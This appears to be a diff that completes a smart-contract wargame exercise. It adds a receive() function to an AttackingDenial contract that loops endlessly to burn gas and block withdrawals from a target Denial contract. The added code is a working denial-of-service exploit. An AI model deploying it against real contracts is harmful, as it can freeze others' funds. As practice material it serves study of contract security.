@@ -10,4 +10,7 @@ contract AttackingDenial {
     }
 
     //Code me!
+    receive() external payable {
+        while(Denial(contractAddress).contractBalance() > 0) {}
+    }
 }
